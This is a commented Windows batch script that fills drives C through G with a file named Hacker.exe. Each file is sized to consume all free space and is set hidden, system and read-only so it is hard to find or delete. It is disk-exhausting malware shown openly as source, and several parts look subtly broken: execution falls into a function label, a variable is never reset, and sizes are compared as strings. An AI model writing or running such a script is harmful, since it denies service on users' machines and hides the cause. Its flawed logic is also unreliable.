@echo off
:: Disable command echoing for cleaner output.

setlocal EnableDelayedExpansion
:: Enables delayed variable expansion using !VAR! instead of %VAR%.
:: This is needed because normal %VAR% expands once *at parse time* (before loop runs),
:: meaning inside loops or if-statements, updated values won't be visible.
:: !VAR! defers expansion to *runtime*, so you get the real, current value as the script executes.

:: Define the drive letters we’ll loop through.
set "drives=C D E F G"

:: A temp file used to store intermediate free space info from WMIC.
set "freeSpaceFile=%temp%\freeSpace.tmp"

:: Prefix for per-drive WMIC result temp files.
set "tempFilePrefix=%temp%\drive"

:: -------------------------------
:: FUNCTION: getFreeSpace [drive]
:: Uses WMIC to get the free space on a drive (in bytes) and stores it in !free!
:: -------------------------------
:getFreeSpace
    set "drive=%~1"
    set "tempFile=%tempFilePrefix%!drive!.tmp"

    :: WMIC command outputs free space info into a temp file
    :: Reason: WMIC prints extra newlines and formatting that’s easier to parse in a file
    wmic logicaldisk where "caption='%drive%:'" get freespace /value > "!tempFile!"

    :: Use findstr to extract the line with "FreeSpace", then split on '=' to get the value
    for /f "tokens=2 delims==" %%A in ('findstr /i "FreeSpace" "!tempFile!"') do (
        set "free=!free!%%A"
    )

    del "!tempFile!" >nul 2>&1
    goto :eof

:: -------------------------------
:: FUNCTION: createAndHideFile [drive] [freeSpace]
:: Creates a hidden, system, read-only file named Hacker.exe that consumes free space.
:: -------------------------------
:createAndHideFile
    set "drive=%~1"
    set "free=%~2"
    set "filePath=!drive!:\Hacker.exe"

    if "!free!" gtr "0" (
        :: fsutil is used here to create a dummy file of exact byte size.
        fsutil file createnew "!filePath!" !free! >nul 2>&1

        :: +s = system, +h = hidden, +r = read-only (makes file harder to notice or delete)
        attrib +s +h +r "!filePath!"
        echo Created and hid file on !drive! with size !free! bytes.
    ) else (
        echo The drive !drive! is full or not available!
    )
    goto :eof

:: -------------------------------
:: MAIN EXECUTION
:: Loop through drives, calculate free space, and fill them with a hidden file.
:: -------------------------------

:: Random value not actually used — may have been for temp naming
set "randomSuffix=!random!!random!"

:: Loop over each drive defined earlier
for %%D in (%drives%) do (
    call :getFreeSpace %%D
    :: Calls the function to get free space and sets !free!

    set "freeSpace%%D=!free!"
    :: Save free space per drive using dynamic variable names like freeSpaceC, etc.

    call :createAndHideFile %%D !free!
    :: Fills that drive with a hidden file if space is available
)

:: -------------------------------
:: SUMMARIZE FREE SPACE USED
:: Adds up all free space values and shows per-drive stats.
:: -------------------------------

set "totalFree=0"
for %%D in (%drives%) do (
    set /a "totalFree+=!freeSpace%%D!"
    echo Free space on %%D: !freeSpace%%D! bytes
)

:: -------------------------------
:: SLOW-REVEAL FINAL MESSAGE
:: Echoes the message one char at a time by slicing string manually
:: This is done for visual effect, but unnecessary for functionality.
:: -------------------------------

set "msg=Script execution completed."
set "chars="

for /l %%i in (0,1,31) do (
    :: CMD substring logic: msg:~start,len
    for /f "tokens=1,2 delims==" %%a in ('cmd /c "echo(%%msg:~%%i,1%%%"') do (
        set "chars=!chars!%%a"
    )
)

echo !chars!

pause
exit
